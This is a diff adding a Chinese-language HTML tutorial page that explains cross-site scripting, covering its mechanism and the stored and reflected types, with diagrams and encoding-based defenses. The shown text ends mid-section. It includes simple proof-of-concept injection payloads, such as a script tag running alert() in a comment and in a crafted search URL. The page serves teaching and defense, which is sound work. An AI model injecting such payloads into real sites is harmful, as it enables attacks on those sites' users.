@@ -1,0 +1,2368 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS 攻击详解与防御</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Roboto+Mono&display=swap"
+        rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+        integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="../../global.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" rel="stylesheet" />
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@latest/dist/mermaid.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.11/purify.min.js"
+        integrity="sha512-Y5zGZyoqZQZJILJzGj2CJFH8I+0P2h7dZ8GU0XHh3U5hFXB7Uh7U7qQj2DGj02fT+QkZk70k5v9/0U+LMgkKcA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <style>
+        /* Minimal inline styles - Primarily rely on global.css and Tailwind */
+
+        /* --- Base & Layout Adjustments --- */
+        html {
+            scroll-padding-top: 6rem;
+            /* Adjust based on potential sticky nav height */
+            scroll-behavior: smooth;
+        }
+
+        body {
+            /* Base font, bg, color assumed from global.css */
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            font-family: 'Inter', sans-serif;
+            /* Match global.css */
+            background-color: var(--bg-color-lighter, #f3f4f6);
+            /* Use variable with fallback */
+            color: var(--text-color-default, #374151);
+            /* Use variable */
+            line-height: var(--base-line-height, 1.65);
+            /* Use variable */
+        }
+
+        /* --- Typography --- */
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            scroll-margin-top: 6rem;
+            /* Offset for sticky nav */
+        }
+
+        /* --- Level Tags --- */
+        .level-tag {
+            display: inline-block;
+            margin-left: 0.5rem;
+            font-size: 0.75rem;
+            /* text-xs */
+            font-weight: 500;
+            /* font-medium */
+            padding: 0.1rem 0.5rem;
+            border-radius: 0.25rem;
+            /* rounded-sm */
+            vertical-align: middle;
+            border: 1px solid transparent;
+        }
+
+        .level-tag-high {
+            background-color: var(--danger-color-light, #fee2e2);
+            color: var(--danger-color, #ef4444);
+            border-color: var(--danger-color, #ef4444);
+        }
+
+        .level-tag-medium {
+            background-color: var(--warning-color-light, #fff7ed);
+            color: var(--warning-color, #f97316);
+            border-color: var(--warning-color, #f97316);
+        }
+
+        .level-tag-low {
+            background-color: var(--secondary-color-light, #ecfdf5);
+            color: var(--secondary-color, #10b981);
+            border-color: var(--secondary-color, #10b981);
+        }
+
+        .level-tag-base {
+            background-color: var(--bg-color-lighter, #f3f4f6);
+            color: var(--text-color-light, #6b7280);
+            border-color: var(--border-color-default, #d1d5db);
+        }
+
+        .level-tag-advanced {
+            /* Added for new section */
+            background-color: var(--primary-color-light, #eff6ff);
+            color: var(--primary-color-dark, #2563eb);
+            border-color: var(--primary-color, #3b82f6);
+        }
+
+
+        /* --- Fade-in Animation (Keep if not in global.css) --- */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .fade-in-section {
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        /* --- Content Card (Use global.css .content-card) --- */
+        /* Adding hover effect from snippet if not in global.css */
+        .content-card:hover {
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1);
+            /* shadow-lg */
+        }
+
+        /* Spacing between cards */
+        .content-section>.content-card+.content-card {
+            margin-top: 1.5rem;
+            /* mb-6 */
+        }
+
+        /* Nested article card styling */
+        .content-card article {
+            margin-bottom: 1.5rem;
+            /* mb-6 */
+            padding: 1rem;
+            /* p-4 */
+            border: 1px solid var(--border-color-light, #e5e7eb);
+            border-radius: 0.5rem;
+            /* rounded-lg */
+            background-color: var(--bg-color-white, white);
+            box-shadow: var(--card-shadow-nested-level1, 0 1px 2px 0 rgb(0 0 0 / 0.06), 0 1px 1px -1px rgb(0 0 0 / 0.06));
+        }
+
+      
+
+        /* --- List Styling (Use global.css .prose/.content-main) --- */
+        article ul {
+            list-style: disc;
+            padding-left: 1.5em;
+            margin-bottom: 1em;
+        }
+
+        article ol {
+            list-style: decimal;
+            padding-left: 1.5em;
+            margin-bottom: 1em;
+        }
+
+        article li {
+            margin-bottom: 0.5em;
+        }
+
+        article ul ul,
+        article ol ol,
+        article ul ol,
+        article ol ul {
+            margin-top: 0.5em;
+            margin-bottom: 0.5em;
+        }
+
+        /* Specific adjustments for lists within nested articles */
+        .content-card article ul,
+        .content-card article ol {
+            padding-left: 1.25em;
+        }
+
+        .content-card article li {
+            font-size: 0.95em;
+        }
+
+
+        /* --- Code Block Styling (Use global.css pre/code and Prism theme) --- */
+        /* Ensure pre uses the mono font and has appropriate styling */
+        article pre {
+            font-family: var(--font-family-mono, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace);
+            border-radius: 0.375rem;
+            /* rounded-md */
+            margin: 1rem 0;
+            /* Ensure margin */
+            padding: 1em;
+            /* Ensure padding */
+            overflow: auto;
+            background-color: #272822;
+            /* Okaidia background */
+            color: #f8f8f2;
+            /* Okaidia default text */
+            border: 1px solid #4d4d4d;
+            /* Darker border for contrast */
+            font-size: 0.875rem;
+            /* text-sm */
+            line-height: 1.4;
+        }
+
+        article pre code[class*="language-"] {
+            background: none;
+            color: inherit;
+            padding: 0;
+            border-radius: 0;
+            font-size: inherit;
+            font-family: inherit;
+            line-height: inherit;
+            text-shadow: none;
+            white-space: pre;
+            display: block;
+        }
+
+        /* Inline code style (Use global.css *:not(pre) > code) */
+        *:not(pre)>code {
+            font-family: var(--font-family-mono, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace);
+            background-color: var(--primary-color-light, #eff6ff);
+            color: var(--primary-color-dark, #2563eb);
+            padding: 0.1rem 0.4rem;
+            border-radius: 0.25rem;
+            /* rounded-sm */
+            font-size: 0.85em;
+            /* Slightly smaller */
+        }
+
+        /* --- Playground Specific Styles --- */
+        .playground {
+            border: 1px solid var(--border-color-light, #e5e7eb);
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+            margin-bottom: 2rem;
+            background-color: var(--bg-color-light, #f9fafb);
+        }
+
+        .playground .output-area {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 0.375rem;
+            /* rounded-md */
+            min-height: 60px;
+            background-color: var(--bg-color-white, white);
+            word-wrap: break-word;
+            line-height: 1.5;
+            font-size: 0.9rem;
+            position: relative;
+            overflow-wrap: break-word;
+        }
+
+        .playground .output-safe {
+            border: 1px dashed var(--success-color, #10b981);
+            /* Use success color */
+            background-color: var(--success-color-light, #ecfdf5);
+        }
+
+        .playground .output-unsafe {
+            border: 1px solid var(--danger-color, #ef4444);
+            /* Use danger color */
+            background-color: var(--danger-color-light, #fee2e2);
+        }
+
+        .playground .output-area .playground-alert {
+            /* Alert inside playground */
+            margin-top: 0.5rem;
+            margin-bottom: 0 !important;
+            /* Override default margin */
+            padding: 0.5rem 0.75rem;
+            font-size: 0.8rem;
+        }
+
+        .playground .output-area .playground-alert .material-icons {
+            font-size: 1rem;
+            margin-right: 0.5rem;
+        }
+
+        .encoded-char {
+            /* Highlighting encoded chars */
+            color: var(--danger-color, #ef4444);
+            font-weight: 700;
+            background-color: var(--danger-color-light, #fee2e2);
+            padding: 0 2px;
+            border-radius: 2px;
+            cursor: help;
+            position: relative;
+        }
+
+        .encoded-char::after {
+            /* Tooltip for encoded chars */
+            content: '已编码';
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: var(--text-color-dark, #1f2937);
+            color: white;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.7rem;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s, visibility 0.2s;
+            z-index: 10;
+            margin-bottom: 4px;
+        }
+
+        .encoded-char:hover::after {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .input-feedback {
+            /* Real-time input feedback */
+            font-size: 0.75rem;
+            /* text-xs */
+            color: var(--danger-color, #ef4444);
+            margin-top: 0.25rem;
+            min-height: 1rem;
+        }
+
+        .input-feedback code {
+            font-size: 0.95em;
+            color: var(--danger-color, #ef4444);
+        }
+
+        .data-setup-area {
+            /* Manual data setup area */
+            background-color: var(--warning-color-light, #fffbeb);
+            border: 1px solid var(--warning-color, #f97316);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .data-setup-area label {
+            font-weight: 500;
+            margin-bottom: 0.25rem;
+            display: block;
+        }
+
+        .data-display-area {
+            /* Data display area */
+            background-color: var(--success-color-light, #ecfdf5);
+            border: 1px solid var(--success-color, #10b981);
+            border-radius: 0.5rem;
+            padding: 0.75rem;
+            margin-top: 0.75rem;
+            font-size: 0.875rem;
+            /* text-sm */
+            word-wrap: break-word;
+        }
+
+        .data-display-area strong {
+            color: var(--success-color, #10b981);
+        }
+
+        /* --- Alert Styling (Use global.css .alert and variants) --- */
+        /* Ensure global.css has .alert, .alert-info, .alert-warning, .alert-danger, .alert-success */
+        /* Adding icon alignment from snippet */
+        .alert {
+            display: flex;
+            align-items: flex-start;
+            /* Align icon top */
+        }
+
+        .alert .material-icons {
+            width: 1.25rem;
+            height: 1.25rem;
+            margin-right: 0.75rem;
+            flex-shrink: 0;
+            margin-top: 0.125rem;
+            font-size: 1.25rem;
+        }
+
+        /* --- Button Styling (Use global.css .button and variants) --- */
+        /* Adding Material-inspired overrides from snippet */
+        button,
+        .button {
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            /* Use global.css styles for colors, padding, etc. */
+        }
+
+        button:hover,
+        .button:hover {
+            box-shadow: 0 2px 4px -1px rgba(0, 0, 0, .2), 0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12);
+        }
+
+        button:disabled,
+        .button:disabled {
+            background-color: #9ca3af;
+            /* gray-400 */
+            cursor: not-allowed;
+            box-shadow: none;
+            opacity: 0.7;
+            /* Add opacity for disabled state */
+        }
+
+        /* Ensure global.css has .button-primary, .button-secondary etc. */
+        button.secondary,
+        .button.secondary {
+            /* Example for secondary */
+            background-color: var(--text-color-light, #6b7280);
+            color: white;
+            border-color: var(--text-color-light, #6b7280);
+        }
+
+        button.secondary:hover,
+        .button.secondary:hover {
+            background-color: var(--text-color-default, #4b5563);
+            border-color: var(--text-color-default, #4b5563);
+        }
+
+        /* --- Input/Textarea Styling --- */
+        input[type="text"],
+        textarea {
+            border: 1px solid var(--border-color-default, #d1d5db);
+            border-radius: 0.25rem;
+            /* rounded-sm */
+            padding: 0.625rem 0.75rem;
+            width: 100%;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            background-color: var(--bg-color-light, #f9fafb);
+            font-size: 0.9rem;
+            /* Adjust font size */
+            color: var(--text-color-default, #374151);
+        }
+
+        input[type="text"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: var(--primary-color, #2563eb);
+            box-shadow: 0 0 0 2px var(--focus-ring-color, rgba(59, 130, 246, 0.3));
+            background-color: var(--bg-color-white, #ffffff);
+        }
+
+        textarea {
+            line-height: 1.5;
+        }
+
+        /* --- Details/Summary Styling --- */
+        details {
+            border-bottom: 1px solid var(--border-color-light, #e5e7eb);
+        }
+
+        details:last-of-type {
+            border-bottom: none;
+        }
+
+        details>summary {
+            list-style: none;
+            cursor: pointer;
+            padding: 1rem 0;
+            /* Increased padding */
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: background-color 0.15s ease-out;
+            color: var(--text-color-dark, #1f2937);
+            font-size: 1.1rem;
+            /* Slightly larger */
+        }
+
+        details>summary:hover {
+            color: var(--primary-color-dark, #2563eb);
+        }
+
+        details>summary::-webkit-details-marker {
+            display: none;
+        }
+
+        details>summary::after {
+            content: '+';
+            font-size: 1.5em;
+            line-height: 1;
+            margin-left: 0.5rem;
+            transition: transform 0.2s ease-in-out;
+            color: var(--text-color-light, #9ca3af);
+        }
+
+        details[open]>summary {
+            margin-bottom: 0.5rem;
+        }
+
+        details[open]>summary::after {
+            transform: rotate(45deg);
+            color: var(--primary-color, #3b82f6);
+        }
+
+        details .details-content {
+            padding-left: 1rem;
+            border-left: 2px solid var(--border-color-light, #e5e7eb);
+            margin-left: 0.25rem;
+            padding-bottom: 1rem;
+            /* Increased padding */
+            font-size: 0.95rem;
+            color: var(--text-color-default, #374151);
+        }
+
+        details .details-content ul {
+            margin-top: 0.5rem;
+        }
+
+        /* --- Mermaid Diagram Styling (Use global.css .mermaid) --- */
+        .mermaid {
+            text-align: center;
+            /* Center the diagram */
+            margin: 1.5rem 0;
+            padding: 1rem;
+            background-color: var(--bg-color-light, #f9fafb);
+            border-radius: 0.375rem;
+            border: 1px solid var(--border-color-light, #e5e7eb);
+        }
+
+        .mermaid svg {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: auto;
+        }
+
+        /* Mobile Menu Styles (Assuming basic structure from snippet) */
+        #menu-toggle {
+            position: fixed;
+            top: 1rem;
+            right: 1rem;
+            z-index: 50;
+            padding: 0.5rem;
+            background-color: white;
+            border-radius: 50%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            border: none;
+            cursor: pointer;
+            display: block;
+            /* Ensure visible */
+        }
+
+        @media (min-width: 768px) {
+
+            /* md breakpoint */
+            #menu-toggle {
+                display: none;
+            }
+        }
+
+        #menu-toggle .material-icons {
+            font-size: 24px;
+            display: block;
+        }
+
+        #menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 30;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none;
+        }
+
+        #menu-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .sidebar {
+            /* Assuming .sidebar class exists for the aside */
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .sidebar.hidden-mobile {
+            transform: translateX(-100%);
+        }
+
+        @media (min-width: 768px) {
+
+            /* md breakpoint */
+            .sidebar.hidden-mobile {
+                transform: translateX(0);
+            }
+        }
+    </style>
+
+</head>
+
+<body class="bg-gray-100">
+
+    <button id="menu-toggle" class="md:hidden">
+        <span class="material-icons">menu</span>
+    </button>
+    <div id="menu-overlay"></div>
+
+    <div class="page-container">
+        <aside id="sidebar" class="local-side-nav sidebar hidden-mobile">
+            <h4 class="head3" class="head4">XSS 攻击详解</h4>
+            <ul id="local-toc" class="space-y-1">
+                <li><a href="#xss-intro" class="active"><span
+                            class="material-icons nav-icon">rocket_launch</span>什么是XSS?</a></li>
+                <li><a href="#xss-how-it-works"
+                        class="flex items-center px-3 py-2 rounded-md text-gray-700 hover:bg-slate-100 transition duration-150 ease-in-out"><span
+                            class="material-icons nav-icon">settings</span>XSS如何工作?</a></li>
+                <li>
+                    <a href="#xss-types"
+                        class="flex items-center px-3 py-2 rounded-md text-gray-700 hover:bg-slate-100 transition duration-150 ease-in-out"><span
+                            class="material-icons nav-icon">library_books</span>XSS的主要类型</a>
+                    <ul class="ml-4 mt-1 space-y-1 border-l border-gray-200 pl-4">
+                        <li><a href="#stored-xss"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">存储型
+                                (Stored)</a></li>
+                        <li><a href="#reflected-xss"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">反射型
+                                (Reflected)</a></li>
+                        <li><a href="#dom-xss"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">DOM型
+                                (DOM-based)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#xss-impact"
+                        class="flex items-center px-3 py-2 rounded-md text-gray-700 hover:bg-slate-100 transition duration-150 ease-in-out"><span
+                            class="material-icons nav-icon">dangerous</span>XSS的危害</a></li>
+                <li>
+                    <a href="#xss-prevention"
+                        class="flex items-center px-3 py-2 rounded-md text-gray-700 hover:bg-slate-100 transition duration-150 ease-in-out"><span
+                            class="material-icons nav-icon">security</span>如何防御XSS?</a>
+                    <ul class="ml-4 mt-1 space-y-1 border-l border-gray-200 pl-4">
+                        <li><a href="#input-validation"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">输入验证与过滤</a>
+                        </li>
+                        <li><a href="#output-encoding"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">输出编码</a>
+                        </li>
+                        <li><a href="#csp"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">内容安全策略
+                                (CSP)</a></li>
+                        <li><a href="#httponly"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">HttpOnly
+                                Cookie</a></li>
+                        <li><a href="#frameworks"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">安全框架/库</a>
+                        </li>
+                        <li><a href="#advanced-defense"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">进阶防御技术</a>
+                        </li> 
+                    </ul>
+                </li>
+                <li>
+                    <a href="#xss-playground"
+                        class="flex items-center px-3 py-2 rounded-md text-gray-700 hover:bg-slate-100 transition duration-150 ease-in-out"><span
+                            class="material-icons nav-icon">smart_toy</span>XSS Playground</a>
+                    <ul class="ml-4 mt-1 space-y-1 border-l border-gray-200 pl-4">
+                        <li><a href="#playground-setup"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">设置演示数据</a>
+                        </li>
+                        <li><a href="#playground-reflected"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">反射型XSS体验</a>
+                        </li>
+                        <li><a href="#playground-stored"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">存储型XSS体验</a>
+                        </li>
+                        <li><a href="#playground-dom"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">DOM型XSS体验</a>
+                        </li>
+                        <li><a href="#playground-dompurify"
+                                class="block px-2 py-1 text-sm text-gray-600 hover:text-sky-600 transition duration-150">DOMPurify净化体验</a>
+                        </li> 
+                    </ul>
+                </li>
+                <li><a href="#xss-interview-prep"
+                        class="flex items-center px-3 py-2 rounded-md text-gray-700 hover:bg-slate-100 transition duration-150 ease-in-out"><span
+                            class="material-icons nav-icon">mic</span>面试高频考点</a></li>
+                <li><a href="#xss-conclusion"
+                        class="flex items-center px-3 py-2 rounded-md text-gray-700 hover:bg-slate-100 transition duration-150 ease-in-out"><span
+                            class="material-icons nav-icon">flag</span>总结与资源</a></li>
+            </ul>
+            <a href="../../index.html" class="back-link">
+                &larr; 返回大纲目录
+            </a>
+        </aside>
+
+        <main class="content-main">
+            <article>
+                <section id="intro" class="content-section fade-in-section" style="animation-delay: 0s;">
+                    <h1 class="head1 flex items-center gap-2">
+                        <span class="material-icons text-3xl text-blue-600">code</span>XSS 攻击详解与防御
+                    </h1>
+                    <p>跨站脚本攻击 (Cross-Site Scripting, XSS) 是 Web
+                        开发中最常见、影响最广泛的安全漏洞之一。理解其原理、类型、危害并掌握有效的防御措施，对于每一位前端和全栈开发者都至关重要。本篇将深入探讨 XSS
+                        攻击的各个方面，并提供实践性的防御策略和面试准备要点。</p>
+                    <p class="mt-4 bg-blue-50 border-l-4 border-blue-500 text-blue-700 p-4 rounded-md text-sm">💡
+                        <strong>提示:</strong> 点击左侧导航可以快速跳转到相应主题。本篇包含交互式 Playground，助您直观理解 XSS 及其防御方法。
+                    </p>
+                </section>
+
+                <section id="xss" class="content-section fade-in-section" style="animation-delay: 0.05s;">
+                    <section id="xss-intro" class="content-card">
+                        <h2 class="head2"><span class="material-icons">rocket_launch</span> 什么是XSS？</h2>
+                        <p class="text-lg text-gray-700 mb-4">
+                            XSS，全称 <strong>Cross-Site Scripting</strong>（跨站脚本攻击），是一种常见的Web应用程序安全漏洞。为了与层叠样式表（Cascading
+                            Style Sheets, CSS）区分，故缩写为XSS。
+                        </p>
+                        <div class="alert alert-info">
+                            <span class="material-icons">lightbulb</span>
+                            <span><strong>核心思想：</strong>
+                                攻击者通过某种方式，将恶意的脚本代码（通常是JavaScript）注入到目标网站的页面中。当其他用户访问这个被污染的页面时，这些恶意脚本就会在用户的浏览器中执行。</span>
+                        </div>
+                        <p class="text-gray-700 mb-4 mt-4">
+                            想象一下，你在一个论坛发帖，但你的帖子内容不仅仅是文字，还包含了一段能窃取其他看帖人信息的代码。当别人浏览你的帖子时，这段代码就在他们的浏览器里悄悄运行了——这就是XSS攻击的直观体现。
+                        </p>
+                        <p class="text-gray-700">
+                            作为全栈开发者，理解XSS至关重要，因为它直接关系到你所开发应用的安全性，关系到用户数据的安全和用户对你产品的信任。在面试中，XSS也是衡量候选人安全意识和基本功的重要指标。
+                        </p>
+                    </section>
+
+                    <section id="xss-how-it-works" class="content-card">
+                        <h2 class="head2"><span class="material-icons">settings</span> XSS是如何工作的？</h2>
+                        <p class="text-gray-700 mb-4">
+                            XSS攻击的发生，本质上是因为Web应用程序 <strong>信任并直接执行了来自用户输入的数据，而没有进行充分的检查和处理</strong>。
+                        </p>
+                        <div class="mermaid my-4 p-3 bg-gray-100 rounded border border-gray-200">
+                            sequenceDiagram
+                            participant A as 攻击者
+                            participant W as Web应用
+                            participant V as 受害者浏览器
+
+                            A->>W: 注入恶意脚本 (例如, 通过表单提交)
+                            W-->>A: (存储型或反射型处理)
+                            Note over W: Web应用未充分处理输入
+                            V->>W: 请求页面
+                            W-->>V: 返回包含恶意脚本的页面
+                            V->>V: 执行页面中的脚本 (包括恶意脚本)
+                            Note over V: 浏览器无法区分脚本来源
+                            V->>A: (可选) 恶意脚本将信息发送给攻击者
+                        </div>
+                        <h3 class="head3">基本流程：</h3>
+                        <ol class="list-decimal list-inside space-y-2 text-gray-700 mb-4 pl-4">
+                            <li><strong>注入点发现：</strong> 攻击者寻找Web应用中接收用户输入并可能将其输出到页面的地方，例如搜索框、评论区、用户资料、URL参数等。</li>
+                            <li><strong>构造恶意脚本：</strong> 攻击者精心构造包含恶意JavaScript代码的输入。</li>
+                            <li><strong>注入脚本：</strong> 攻击者将恶意输入提交给Web应用程序。</li>
+                            <li><strong>存储或反射：</strong>
+                                <ul class="list-disc list-inside ml-4 mt-1">
+                                    <li><strong>存储型：</strong> 应用程序将恶意输入存储到数据库或其他地方。</li>
+                                    <li><strong>反射型/DOM型：</strong> 应用程序直接（或在客户端）将恶意输入输出到响应页面中。</li>
+                                </ul>
+                            </li>
+                            <li><strong>受害者访问：</strong> 不知情的用户访问了包含恶意脚本的页面（或点击了包含恶意脚本的链接）。</li>
+                            <li><strong>脚本执行：</strong>
+                                用户的浏览器接收到页面内容，发现其中包含的脚本，并执行它。由于脚本在目标网站的域下执行，它可以访问该域下的Cookie、LocalStorage等信息，并能操作页面DOM。
+                            </li>
+                            <li><strong>攻击得逞：</strong> 恶意脚本执行预设的恶意操作，如窃取信息、重定向、修改页面等。</li>
+                        </ol>
+                        <div class="alert alert-warning">
+                            <span class="material-icons">warning</span>
+                            <span><strong>关键点：</strong>
+                                浏览器无法区分脚本是来自网站本身的，还是由攻击者注入的。只要脚本出现在页面中，浏览器就会尝试执行它。XSS利用的就是这种信任机制。</span>
+                        </div>
+                    </section>
+
+                    <section id="xss-types" class="content-card">
+                        <h2 class="head2"><span class="material-icons">library_books</span> XSS的主要类型</h2>
+                        <p class="text-gray-700 mb-6">XSS攻击根据恶意脚本的注入方式和触发时机，主要分为三种类型：存储型、反射型和DOM型。</p>
+                        <article id="stored-xss" class="mb-8">
+                            <h3 class="head3">存储型 XSS (Stored/Persistent XSS)</h3>
+                            <p class="text-gray-600 mb-3">这是最直接也是潜在危害最大的一种XSS。</p>
+                            <h4 class="head3">背景（问题）：</h4>
+                            <p class="text-gray-700 mb-3">
+                                Web应用程序接收了用户的输入（比如文章、评论、用户昵称等），并且
+                                <strong>没有经过充分过滤或编码，就将其永久性地存储在服务器端</strong>（如数据库、文件系统）。
+                            </p>
+                            <h4 class="head3">技术（是什么）：</h4>
+                            <p class="text-gray-700 mb-3">
+                                当其他用户请求包含这些被污染数据的页面时，服务器会从存储中取出这些数据，并将其嵌入到HTML页面中返回给用户的浏览器。如果数据中包含恶意脚本，它就会作为页面的一部分被浏览器执行。
+                            </p>
+                            <div class="mermaid my-3 p-2 bg-gray-100 rounded border border-gray-200">
+                                sequenceDiagram
+                                participant A as 攻击者
+                                participant W as Web应用/服务器
+                                participant DB as 数据库
+                                participant V as 受害者浏览器
+
+                                A->>W: 提交包含脚本的评论/帖子
+                                W->>DB: 存储未过滤的评论 (含脚本)
+                                Note over W,DB: 脚本被存入数据库
+                                V->>W: 请求包含该评论的页面
+                                W->>DB: 读取评论
+                                DB-->>W: 返回含脚本的评论
+                                W-->>V: 将评论(含脚本)嵌入页面并发送
+                                V->>V: 解析页面, 执行恶意脚本
+                                Note over V: 脚本在受害者浏览器执行
+                            </div>
+                            <h4 class="head3">如何发生（举例）：</h4>
+                            <ol class="list-decimal list-inside space-y-1 text-gray-700 mb-3 pl-4">
+                                <li>攻击者在一个允许用户留言的页面提交了包含恶意脚本的留言：<code>&lt;script&gt;alert('恶意脚本执行！');&lt;/script&gt;</code>。
+                                </li>
+                                <li>服务器未经过滤，将这段留言存储到数据库中。</li>
+                                <li>其他用户访问该留言页面。</li>
+                                <li>服务器从数据库读取留言，并将其插入到HTML中。</li>
+                                <li>用户的浏览器收到HTML，执行了其中的<code>&lt;script&gt;</code>标签。</li>
+                            </ol>
+                            <h4 class="head3">如何解决（预防）：</h4>
+                            <p class="text-gray-700">
+                                主要靠 <strong>输入验证</strong> 和 <strong>输出编码</strong>。存储前进行验证，但更关键的是在
+                                <strong>从数据库取出数据显示给用户时，必须进行严格的HTML编码</strong>，将特殊字符（如 <code>&lt;</code>,
+                                <code>&gt;</code>, <code>"</code>, <code>'</code>）转换为HTML实体（如 <code>&amp;lt;</code>,
+                                <code>&amp;gt;</code>, <code>&amp;quot;</code>, <code>&amp;#39;</code>）。
+                            </p>
+                        </article>
+                        <article id="reflected-xss" class="mb-8">
+                            <h3 class="head3">反射型 XSS (Reflected/Non-Persistent XSS)</h3>
+                            <p class="text-gray-600 mb-3">这种XSS不涉及数据存储，恶意脚本通常作为URL的一部分。</p>
+                            <h4 class="head3">背景（问题）：</h4>
+                            <p class="text-gray-700 mb-3">
+                                Web应用程序接收来自用户请求的数据（通常是URL参数），<strong>未经充分处理就直接在响应页面中“反射”出来</strong>。
+                            </p>
+                            <h4 class="head3">技术（是什么）：</h4>
+                            <p class="text-gray-700 mb-3">
+                                攻击者构造一个包含恶意脚本的特制URL，并诱导用户点击这个URL。当用户点击后，浏览器向服务器发送请求，服务器处理请求，并将URL中的恶意脚本未经编码地嵌入到返回的HTML页面中。用户的浏览器收到响应后执行该脚本。
+                            </p>
+                            <div class="mermaid my-3 p-2 bg-gray-100 rounded border border-gray-200">
+                                sequenceDiagram
+                                participant A as 攻击者
+                                participant V as 受害者
+                                participant W as Web应用/服务器
+                                participant VB as 受害者浏览器
+
+                                A->>V: 诱导点击恶意链接 (含脚本)
+                                V->>VB: 点击链接
+                                VB->>W: 发送包含脚本的请求 (如URL参数)
+                                W-->>VB: 将脚本"反射"到响应页面中 (未编码)
+                                Note over W: 服务器未对输入进行编码处理
+                                VB->>VB: 解析页面, 执行恶意脚本
+                                Note over VB: 脚本在受害者浏览器执行
+                            </div>
+                            <h4 class="head3">如何发生（举例）：</h4>
+                            <ol class="list-decimal list-inside space-y-1 text-gray-700 mb-3 pl-4">
+                                <li>假设网站有一个搜索功能，URL是 <code>https://example.com/search?query=关键词</code>，并且搜索结果页面会显示
+                                    "您搜索了：关键词"。</li>
+                                <li>攻击者构造恶意URL：<code>https://example.com/search?query=&lt;script&gt;alert('XSS');&lt;/script&gt;</code>。
+                                </li>
+                                <li>攻击者通过邮件、社交媒体等方式诱导用户点击此链接。</li>
+                                <li>用户点击链接，浏览器向服务器发送请求。</li>
+                                <li>服务器未对<code>query</code>参数做处理，直接将其插入到返回的HTML中，例如：<code>&lt;p&gt;您搜索了：&lt;script&gt;alert('XSS');&lt;/script&gt;&lt;/p&gt;</code>。
+                                </li>
+                                <li>用户的浏览器执行了脚本。</li>
+                            </ol>
+                            <h4 class="head3">如何解决（预防）：</h4>
+                            <p class="text-gray-700">
+                                同样需要 <strong>输入验证</strong> 和
+                                <strong>输出编码</strong>。对所有来自请求（特别是URL参数、POST数据）并在页面中显示的数据，进行严格的HTML编码。现代浏览器通常内置了一些反射型XSS的防御机制（XSS
+                                Auditor/Filter），但不能完全依赖。
